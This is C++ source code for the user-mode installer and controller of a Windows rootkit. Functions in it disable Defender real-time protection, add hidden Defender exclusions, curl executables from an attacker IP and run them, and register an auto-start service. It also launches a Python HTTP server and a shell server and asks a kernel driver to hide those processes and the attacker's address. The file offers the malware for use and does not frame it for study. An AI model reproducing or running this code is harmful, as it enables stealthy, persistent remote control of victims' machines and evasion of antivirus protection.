#include "helpers.h"
#include "requests.h"
#pragma warning(disable : 4244)
#pragma warning(disable : 4267)
#define MEDIUM_AS_SOURCE_MODULE "mymyymym"


std::uint32_t GeneralHelpers::GetPID(std::string PrcName) {
	PROCESSENTRY32 PrcEntry;
	const UniqueHndl snapshot_handle(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL));  // take snapshot of all current processes
	if (snapshot_handle.get() == INVALID_HANDLE_VALUE) {
		return NULL; // invalid handle
	}
	PrcEntry.dwSize = sizeof(PROCESSENTRY32);  // set size of function process entry (after validating the given handle)
	while (Process32Next(snapshot_handle.get(), &PrcEntry) == TRUE) {
		std::wstring wideExeFile(PrcEntry.szExeFile);
		std::string narrowExeFile(wideExeFile.begin(), wideExeFile.end());

		if (strcmp(PrcName.c_str(), narrowExeFile.c_str()) == 0) {
			return PrcEntry.th32ProcessID;  // return the PID of the required process from the process snapshot
		}
	}
	return NULL;  // if something did not work correctly
}


int GeneralHelpers::CharpToWcharp(const char* ConvertString, WCHAR* ConvertedString) {
    int WideNameLen = MultiByteToWideChar(CP_UTF8, 0, ConvertString, -1, NULL, 0);
    MultiByteToWideChar(CP_UTF8, 0, ConvertString, -1, ConvertedString, WideNameLen);
    return WideNameLen;
}


int GeneralHelpers::WcharpToCharp(char* ConvertedString, const WCHAR* ConvertString) {
    int MultiByteLen = WideCharToMultiByte(CP_UTF8, 0, ConvertString, -1, NULL, 0, NULL, NULL);
    WideCharToMultiByte(CP_UTF8, 0, ConvertString, -1, ConvertedString, MultiByteLen, NULL, NULL);
    return MultiByteLen;
}


std::wstring GeneralHelpers::GetCurrentPath() {
    TCHAR PathBuffer[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, PathBuffer, MAX_PATH);
    std::wstring::size_type PathEndPos = std::wstring(PathBuffer).find_last_of(L"\\/");
    return std::wstring(PathBuffer).substr(0, PathEndPos);
}


int GeneralHelpers::CountOccurrences(const char* SearchStr, char SearchLetter) {
    DWORD Count = 0;
    for (int i = 0; i < strlen(SearchStr); i++) {
        if (SearchStr[i] == SearchLetter) {
            Count++;
        }
    }
    return Count;
}


void GeneralHelpers::GetServiceName(char* Path, char* Buffer) {
    char TempBuffer[MAX_PATH] = { 0 };
    int bi = 0;
    int acbi = 0;
    int pi = (int)strlen(Path) - 1;

    for (; pi >= 0; pi--, bi++) {
        if (Path[pi] == '\\') {
            break;
        }
        TempBuffer[bi] = Path[pi];
    }
    TempBuffer[bi] = '\0';
    for (bi = (int)strlen(TempBuffer) - 1; bi >= 0; bi--, acbi++) {
        Buffer[acbi] = TempBuffer[bi];
    }
}


void GeneralHelpers::ReplaceValues(const char* BaseString, REPLACEMENT RepArr[], char* Output, int Size) {
    int ii = 0;
    int repi = 0;
    int comi = 0;

    for (int i = 0; i <= strlen(BaseString); i++) {
        if (repi < Size && BaseString[i] == RepArr[repi].WhereTo) {
            memcpy((PVOID)((ULONG64)Output + comi), RepArr[repi].Replace, strlen(RepArr[repi].Replace));
            comi += strlen(RepArr[repi].Replace);

            RepArr[repi].RepCount -= 1;
            if (RepArr[repi].RepCount == 0) {
                repi++;
            }
        }
        else {
            Output[comi] = BaseString[i];
            comi++;
        }
    }
}


DWORD GeneralHelpers::ExecuteSystem(const char* BaseCommand, REPLACEMENT RepArr[], int Size) {
    char Command[500] = { 0 };
    ReplaceValues(BaseCommand, RepArr, Command, Size);
    if (system(Command) == -1) {
        return GetLastError();
    }
    return 0;
}


void GeneralHelpers::GetRandomName(char* NameBuf, DWORD RandSize, const char* Extension) {
    const char* Alp = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,;[]{}-_=+)(&^%$#@!~`";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distr(0, strlen(Alp) - 1);
    int i = 0;
    for (; i < (int)RandSize; i++) {
        NameBuf[i] = Alp[distr(gen)];
    }
    for (int exti = 0; exti <= strlen(Extension); exti++, i++) {
        NameBuf[i] = Extension[exti];
    }
}


int GeneralHelpers::GetPidByName(const char* Name) {
    int ProcessId = 0;
    DWORD Procs[1024] = { 0 }, BytesReturned = 0, ProcessesNum = 0;
    char CurrentName[MAX_PATH] = { 0 };
    HANDLE CurrentProc = INVALID_HANDLE_VALUE;
    HMODULE CurrentProcMod = NULL;

    // Get the list of PIDs of all running processes: 
    if (!EnumProcesses(Procs, sizeof(Procs), &BytesReturned))
        return 0;
    ProcessesNum = BytesReturned / sizeof(DWORD);

    for (int i = 0; i < ProcessesNum; i++) {
        if (Procs[i] != 0) {
            CurrentProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, Procs[i]);
            if (CurrentProc != NULL) {
                if (EnumProcessModules(CurrentProc, &CurrentProcMod, sizeof(CurrentProcMod), &BytesReturned)) {
                    GetModuleBaseNameA(CurrentProc, CurrentProcMod, CurrentName, sizeof(CurrentName) / sizeof(TCHAR));
                    if (lstrcmpiA(Name, CurrentName) == 0) {
                        ProcessId = Procs[i];
                        break;
                    }
                }
                CloseHandle(CurrentProc);
            }
        }
    }
    return ProcessId;
}


int GeneralHelpers::CheckLetterInArr(char Chr, const char* Arr) {
    for (int i = 0; i < strlen(Arr); i++) {
        if (Arr[i] == Chr) {
            return i;
        }
    }
    return -1;
}


BOOL GeneralHelpers::PerformCommand(const char* CommandArr[], const char* Replacements[], const char* Symbols, int CommandCount, int SymbolCount) {
    int ActualSize = 1;
    int CurrRepIndex = 0;
    int ActualCommandIndex = 0;
    int SystemReturn = -1;

    for (int ci = 0; ci < CommandCount; ci++) {
        ActualSize += strlen(CommandArr[ci]);
        for (int si = 0; si < SymbolCount; si++) {
            ActualSize -= CountOccurrences(CommandArr[ci], Symbols[si]);
            for (int r = 0; r < CountOccurrences(CommandArr[ci], Symbols[si]); r++) {
                ActualSize += strlen(Replacements[si]);
            }
        }
    }

    char* ActualCommand = (char*)malloc(ActualSize);
    if (ActualCommand == NULL) {
        return FALSE;
    }

    for (int ci = 0; ci < CommandCount; ci++) {
        for (int cii = 0; cii < strlen(CommandArr[ci]); cii++) {
            CurrRepIndex = CheckLetterInArr(CommandArr[ci][cii], Symbols);
            if (CurrRepIndex == -1) {
                ActualCommand[ActualCommandIndex] = CommandArr[ci][cii];
                ActualCommandIndex++;
            }
            else {
                for (int ri = 0; ri < strlen(Replacements[CurrRepIndex]); ri++) {
                    ActualCommand[ActualCommandIndex] = Replacements[CurrRepIndex][ri];
                    ActualCommandIndex++;
                }
            }
        }
    }
    ActualCommand[ActualCommandIndex] = '\0';
    SystemReturn = system(ActualCommand);
    if (SystemReturn == -1) {
        free(ActualCommand);
        return FALSE;
    }
    free(ActualCommand);
    return TRUE;
}


BOOL GeneralHelpers::DoesPathEndWithFile(char* DirPath) {
    char LastPathPart[MAX_PATH] = { 0 };
    int PathIndex = 0;
    if (DirPath == NULL) {
        return FALSE;  // No path
    }
    PathIndex = strlen(DirPath) - 1;
    while (DirPath[PathIndex] != '\\' && PathIndex >= 0) {
        PathIndex--;
    }
    if (PathIndex < 0) {
        return FALSE;  // invalid path, no '\' found in path
    }
    RtlCopyMemory(LastPathPart, (PVOID)((ULONG64)DirPath + PathIndex + 1), 
        strlen(DirPath) - (PathIndex + 1));  // Move one character forward

}


HANDLE GeneralHelpers::StartThread(PVOID ThreadAddress, PVOID ThreadParameters) {
    HANDLE CurrentThreadHandle = INVALID_HANDLE_VALUE;
    SECURITY_ATTRIBUTES ThreadAttributes = { 0 };
    ThreadAttributes.bInheritHandle = FALSE;
    ThreadAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
    ThreadAttributes.lpSecurityDescriptor = NULL;
    CurrentThreadHandle = CreateThread(&ThreadAttributes,
        0,
        (LPTHREAD_START_ROUTINE)ThreadAddress,
        ThreadParameters,
        0,
        NULL);

    return CurrentThreadHandle;
}


ULONG GeneralHelpers::CalculateAddressValue(char* IpAddress) {
    BYTE IpFields[4] = { 0 };
    BYTE CurrentField = 0;
    int CurrentFieldIndex = 0;
    if (IpAddress == NULL) {
        return 0;
    }
    for (int CurrentDigit = 0; CurrentDigit < strlen(IpAddress); CurrentDigit++) {
        if (IpAddress[CurrentDigit] == '.') {
            IpFields[CurrentFieldIndex] = CurrentField;
            CurrentField = 0;
            CurrentFieldIndex++;
        }
        else {
            CurrentField *= 10;
            CurrentField += (IpAddress[CurrentDigit] - 0x30);
        }
    }
    IpFields[3] = CurrentField;
    return *(ULONG*)(IpFields);
}


BOOL GeneralHelpers::IsValidIp(char* Address) {
    DWORD CurrChunkValue = 0;
    if (Address == NULL || GeneralHelpers::CountOccurrences(Address, '.') != 3) {
        return FALSE;
    }

    for (int i = 0; i < strlen(Address); i++) {
        if (Address[i] != '.') {
            if (isdigit(Address[i]) == 0 && Address[i]) {
                return FALSE;
            }
            CurrChunkValue *= 10;
            CurrChunkValue += (Address[i] - 0x30);
        }
        else {
            if (!(CurrChunkValue >= 0 && CurrChunkValue <= 255)) {
                return FALSE;
            }
            CurrChunkValue = 0;
        }
    }
    return TRUE;
}


DWORD RootkitInstall::ExcludeRootkitFiles() {
    HKEY RegistryKey = NULL;
    DWORD KeyValue = 1;
    LSTATUS Status = ERROR_SUCCESS;


    // Create exclusion for virus files:
    if (system("powershell -inputformat none -outputformat none -NonInteractive -Command"
        " Add-MpPreference -ExclusionPath \"C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\"") == -1) {
        return 1;
    }


    // Hide exclusions:
    Status = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "Software\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &RegistryKey);
    if (Status != ERROR_SUCCESS) {
        return Status;
    }
    Status = RegSetValueExA(RegistryKey, "HideExclusionsFromLocalAdmins", 0, REG_DWORD,
        (const BYTE*)&KeyValue, sizeof(KeyValue));
    if (Status != ERROR_SUCCESS) {
        RegCloseKey(RegistryKey);
        return Status;
    }
    RegCloseKey(RegistryKey);
    return 0;
}


int RootkitInstall::VerifyDependencies(const char* AttackerIp) {
    const char* FileCommands[] = { "if not exist C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5 mkdir C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5 && ",
        "curl http://~:8080/WebScraper/x64/Release/WebScraper.exe --output C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\WebScraper.exe && ",
        "curl http://~:8080/rootkit_catalog.txt --output C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\rootkit_catalog.txt && ",
        "C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\WebScraper.exe C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\rootkit_catalog.txt ~" };

    const char* ReplaceArr[1] = { AttackerIp };
    const char* SymbolsArr = "~";
    const int TotalCommands = 4;
    if (!GeneralHelpers::PerformCommand(FileCommands, ReplaceArr, SymbolsArr, TotalCommands, 1)) {
        return (int)GetLastError();
    }
    return 0;
}


BOOL WINAPI RootkitInstall::CtrlHandler(DWORD ControlType) {
    switch (ControlType) {
    case CTRL_SHUTDOWN_EVENT: 
        system("sc stop RootAuto");
        system("sc delete RootAuto");
        system("sc create RootAuto type=own start=auto binPath=\"C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\AutoStart.exe\"");
        system("echo handler triggered > c:\\handler.txt");
        return TRUE;
    default:
        return FALSE;
    }
}


RETURN_LAST RootkitInstall::RealTime(BOOL IsDisable) {
    RETURN_LAST LastError = { 0, ERROR_SUCCESS };
    const char* Disable = "powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $true\" > nul";
    const char* Enable = "powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $false\" > nul";
    if (IsDisable) {
        LastError.LastError = system(Disable);
    }
    else {
        LastError.LastError = system(Enable);
    }

    if (LastError.LastError == -1) {
        LastError.LastError = GetLastError();
        LastError.Represent = ERROR_GENERIC_COMMAND_FAILED;
        return LastError;
    }
    LastError.LastError = 0;
    return LastError;
}


char* RootkitInstall::ExtractGateways(char* IpConfigOutput) {
    SIZE_T NextGatewayOffset = 0;
    ULONG64 CurrentAddressSize = 0;
    ULONG64 OccurenceOffset = 0;
    ULONG64 GatewayBufferSize = 0;
    char CurrentAddress[MAX_PATH] = { 0 };
    char* GatewayBuffer = NULL;
    char* TemporaryBuffer = NULL;
    const char* GatewayIdentifier = "Default Gateway . . . . . . . . . : ";
    std::string StringOutput(IpConfigOutput);
    if (IpConfigOutput == NULL) {
        return NULL;
    }

    NextGatewayOffset = StringOutput.find(GatewayIdentifier, 0);
    while (NextGatewayOffset != std::string::npos) {
        OccurenceOffset = NextGatewayOffset + strlen(GatewayIdentifier);
        if (StringOutput.c_str()[OccurenceOffset] == '\r' &&
            StringOutput.c_str()[OccurenceOffset + 1] == '\n') {
            goto NextGateway;  // No gateway address specified
        }

        // Copy current address:
        for (CurrentAddressSize = 0; !(StringOutput.c_str()[OccurenceOffset + CurrentAddressSize] == '\r' &&
            StringOutput.c_str()[OccurenceOffset + CurrentAddressSize + 1] == '\n'); CurrentAddressSize++) {
            CurrentAddress[CurrentAddressSize] = StringOutput.c_str()[OccurenceOffset + CurrentAddressSize];
        }
        CurrentAddress[CurrentAddressSize] = '\0';


        // Only handle valid IPv4 addresses:
        if (GeneralHelpers::IsValidIp(CurrentAddress)) {
            if (GatewayBuffer == NULL) {
                GatewayBuffer = (char*)malloc(CurrentAddressSize + 1);  // Always null terminate
                if (GatewayBuffer == NULL) {
                    return NULL;
                }
                RtlCopyMemory(GatewayBuffer, CurrentAddress, CurrentAddressSize + 1);
            }
            else {
                TemporaryBuffer = (char*)malloc(strlen(GatewayBuffer) + CurrentAddressSize + 2);  // +2 for null terminator and '~'
                if (TemporaryBuffer == NULL) {
                    free(GatewayBuffer);
                    return NULL;
                }
                RtlCopyMemory(TemporaryBuffer, GatewayBuffer, strlen(GatewayBuffer));
                TemporaryBuffer[strlen(GatewayBuffer)] = '~';
                RtlCopyMemory(TemporaryBuffer + strlen(GatewayBuffer) + 1, CurrentAddress,
                    CurrentAddressSize);
                TemporaryBuffer[strlen(GatewayBuffer) + CurrentAddressSize + 1] = '\0';
                free(GatewayBuffer);
                GatewayBuffer = TemporaryBuffer;
            }

        }
    NextGateway:
        NextGatewayOffset = StringOutput.find(GatewayIdentifier, NextGatewayOffset + strlen(GatewayIdentifier));
    }
    return GatewayBuffer;
}


char* RootkitInstall::GetGatewayList() {
    HANDLE FileHandle = INVALID_HANDLE_VALUE;
    ULONG64 FileDataSize = 0;
    char* FileData = NULL;
    char* FilteredData = NULL;
    system("ipconfig /all > IpConfigOutput");
    if (RequestHelpers::FileOperation((char*)"IpConfigOutput", &FileHandle, (PVOID*)&FileData, &FileDataSize, FALSE, TRUE) != 0 ||
        FileHandle == NULL) {
        return NULL;
    }
    FilteredData = RootkitInstall::ExtractGateways(FileData);
    free(FileData);
    system("del /s /q IpConfigOutput");
    return FilteredData;
}


BOOL RequestHelpers::ValidateInfoTypeString(const char* InfoType) {
    if (strlen(InfoType) > 5 || strlen(InfoType) == 0) {
        return FALSE;
    }

    std::string cppString("rbptcPieIL");
    for (int i = 0; InfoType[i] != '\0'; i++) {
        if (cppString.find(InfoType[i]) == std::string::npos) {
            return FALSE;
        }
    }
    return TRUE;
}


void RequestHelpers::LogMessage(const char* Message, LogFile* MediumLog, BOOL IsError, int ErrorCode) {
    printf(Message);
    /*
    if (MediumLog != NULL) {
        if (IsError) {
            if (ErrorCode == 0) {
                MediumLog->WriteError(Message, GetLastError());
            }
            else {
                MediumLog->WriteError(Message, ErrorCode);
            }
        }
        else {
            MediumLog->WriteLog((PVOID)Message, strlen(Message) + 1);  // Also write null terminator
        }
    }
    */
}


BOOL RequestHelpers::ShouldQuit() {
    // Returns if the medium should stop working (debugging, forensics, special errors..) -
    return FALSE;
}


int RequestHelpers::FileOperation(char* FilePath, HANDLE* FileHandle, PVOID* FileData, ULONG64* FileDataSize, BOOL IsWrite, BOOL ShouldNullTerm) {
    DWORD OperationOutput = 0;
    if (FileHandle == NULL || FilePath == NULL || FileData == NULL || FileDataSize == NULL) {
        return -1;
    }
    if (IsWrite) {
        *FileHandle = CreateFileA(FilePath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    }
    else {
        *FileHandle = CreateFileA(FilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    }
    if (*FileHandle == INVALID_HANDLE_VALUE) {
        return 1;  // Invalid handle
    }
    *FileDataSize = GetFileSize(*FileHandle, 0);
    if (*FileDataSize == 0) {
        CloseHandle(*FileHandle);
        return 2;  // File size = 0
    }
    *FileData = malloc(*FileDataSize + ShouldNullTerm);  // If null terminated: needs +1 character (TRUE = 1)
    if (*FileData == NULL) {
        CloseHandle(*FileHandle);
        return 3;  // Malloc failed
    }
    if ((!IsWrite && (!ReadFile(*FileHandle, *FileData, *FileDataSize, &OperationOutput, NULL) ||
        OperationOutput != *FileDataSize)) ||
        (IsWrite && (!WriteFile(*FileHandle, *FileData, *FileDataSize, &OperationOutput, NULL) ||
            OperationOutput != *FileDataSize))) {
        CloseHandle(*FileHandle);
        free(*FileData);
        return 4;  // Actual operation failed
    }
    if (ShouldNullTerm) {
        ((char*)(*FileData))[*FileDataSize] = '\0';
    }
    CloseHandle(*FileHandle);
    return 0;
}


ROOTKIT_UNEXERR RequestHelpers::ResolvePID(char* ModuleName, ULONG64* ProcessId) {
    if (ModuleName == NULL || ProcessId == NULL) {
        return invalidargs;
    }
    if (strcmp(ModuleName, MEDIUM_AS_SOURCE_MODULE) == 0 ||
        strcmp(ModuleName, REGULAR_BUFFER_WRITE) == 0) {
        *ProcessId = (ULONG64)GetCurrentProcessId();
    }
    else {
        *ProcessId = (ULONG64)GeneralHelpers::GetPID(ModuleName);
    }
    if (*ProcessId == 0) {
        return relevantpid;
    }
    return successful;
}


int MajorOperation::TerminateMedium(NETWORK_INFO* SndInfo, HANDLE* PipeHandle, BOOL* IsValidPipe, int ReturnStatus) {
    if (SndInfo != NULL) {
        closesocket(SndInfo->AsoSock);
    }
    if (IsValidPipe != NULL) {
        *IsValidPipe = FALSE;
    }
    if (PipeHandle != NULL) {
        DisconnectNamedPipe(*PipeHandle);
        if (*PipeHandle != INVALID_HANDLE_VALUE) {
            CloseHandle(*PipeHandle);
            *PipeHandle = INVALID_HANDLE_VALUE;
        }
    }
    return ReturnStatus;
}


DWORD MajorOperation::ConnectToNamedPipe(HANDLE* PipeHandle, LogFile* MediumLog, BOOL* IsValidPipe) {
    DWORD LastError = 0;
    *IsValidPipe = ConnectNamedPipe(*PipeHandle, NULL);
    if (!*IsValidPipe) {
        LastError = GetLastError();
        if (LastError == ERROR_PIPE_CONNECTED) {
            *IsValidPipe = TRUE;
            RequestHelpers::LogMessage("MainMedium pipe - driver already connected to pipe between creating it and connecting to it!\n", NULL, FALSE, 0);
        }
        else {
            RequestHelpers::LogMessage("MainMedium pipe - error while connecting to pipe\n", NULL, TRUE, LastError);
            if (*PipeHandle != INVALID_HANDLE_VALUE) {
                CloseHandle(*PipeHandle);
                *PipeHandle = INVALID_HANDLE_VALUE;
            }
        }
    }
    else {
        RequestHelpers::LogMessage("MainMedium pipe - driver connected to pipe like expected\n", NULL, FALSE, 0);
    }
    return LastError;
}


void MajorOperation::ClientServiceThread(PVOID ServiceParameters) {
    switch ((ULONG64)ServiceParameters) {
    case 0x1000:
        system("cd C:\\ && C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\MinPython\\Scripts\\python.exe -m http.server 8050"); break;
    
    case 0x4000:
        system("C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\MinPython\\Scripts\\python.exe "
            "C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\ExtraTools\\Shell\\ShellServer.py"); break;

    default:
        break;
    }
}


BOOL MajorOperation::InitializeClientServices() {
    /*
    Assumptions:
    1) all files were installed accordingly (in addition to minimal-python.zip)
    2) minimal-python.zip was only installed, not extracted
    */
    HANDLE CurrentThreadHandle = INVALID_HANDLE_VALUE;


    // Install python quietly if not installed already:
    if (system("C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\MinPython\\pythoninstaller.exe /quiet") == -1) {
        return FALSE;
    }


    // Unzip minimal-python.zip and start the web server:
    if (system("cd C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\MinPython && "
        "tar -xf C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\MinPython\\minpython.zip") == -1) {
        return FALSE;
    }
    CurrentThreadHandle = GeneralHelpers::StartThread(&MajorOperation::ClientServiceThread,
        (PVOID)0x1000);
    if (CurrentThreadHandle == INVALID_HANDLE_VALUE) {
        return FALSE;
    }


    // Activate shell server:
    CurrentThreadHandle = GeneralHelpers::StartThread(&MajorOperation::ClientServiceThread,
        (PVOID)0x4000);
    if (CurrentThreadHandle == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    return TRUE;
}


BOOL MajorOperation::HideClientServices(HANDLE* PipeHandle, LogFile* MediumLog, ULONG AddressInfo) {
    ROOTKIT_MEMORY RootkInst = { 0 };
    int DriverResult = 0;
    const char* ProcessToHide = "python.exe";


    // Hide 4 python programs (shell,webserver * 2 as 2 instances are launched):
    for (int PythonHideCount = 0; PythonHideCount < 4; PythonHideCount++) {
        if (RequestHelpers::ResolvePID((char*)ProcessToHide, &RootkInst.MainPID) != successful) {
            return FALSE;
        }
        RootkInst.Operation = RKOP_HIDEPROC;
        RootkInst.MdlName = (char*)ProcessToHide;
        RootkInst.MedPID = (ULONG64)GetCurrentProcessId();
        RootkInst.Reserved = (PVOID)HideProcess;
        RootkInst.Unexpected = successful;
        DriverResult = DriverCalls::CallKernelDriver(0, &RootkInst, FALSE, PipeHandle, MediumLog);
        if (DriverResult != 1 || RootkInst.IsFlexible || RootkInst.Status != 0 ||
            RootkInst.StatusCode != ROOTKSTATUS_SUCCESS) {
            return FALSE;  // No operation was done, STATUS_SUCCESS = (NTSTATUS)0
        }
    }


    // Hide the attacker IP address (and also add 0):
    RootkInst.Operation = RKOP_HIDEADDR;
    RootkInst.SemiPID = (ULONG64)AddressInfo;
    RootkInst.Buffer = (PVOID)AddressInfo;
    RootkInst.Reserved = 0;
    RootkInst.Size = HideAddress;
    RootkInst.Unexpected = successful;
    DriverResult = DriverCalls::CallKernelDriver(0, &RootkInst, FALSE, PipeHandle, MediumLog);
    if (DriverResult != 1 || RootkInst.IsFlexible || RootkInst.Status != 0 ||
        RootkInst.StatusCode != ROOTKSTATUS_SUCCESS) {
        return FALSE;  // No operation was done, STATUS_SUCCESS = (NTSTATUS)0
    }
    RootkInst.Operation = RKOP_HIDEADDR;
    RootkInst.SemiPID = 0;
    RootkInst.Buffer = 0;
    RootkInst.Reserved = 0;
    RootkInst.Size = HideAddress;
    RootkInst.Unexpected = successful;
    DriverResult = DriverCalls::CallKernelDriver(0, &RootkInst, FALSE, PipeHandle, MediumLog);
    if (DriverResult != 1 || RootkInst.IsFlexible || RootkInst.Status != 0 ||
        RootkInst.StatusCode != ROOTKSTATUS_SUCCESS) {
        return FALSE;  // No operation was done, STATUS_SUCCESS = (NTSTATUS)0
    }
    return TRUE;
}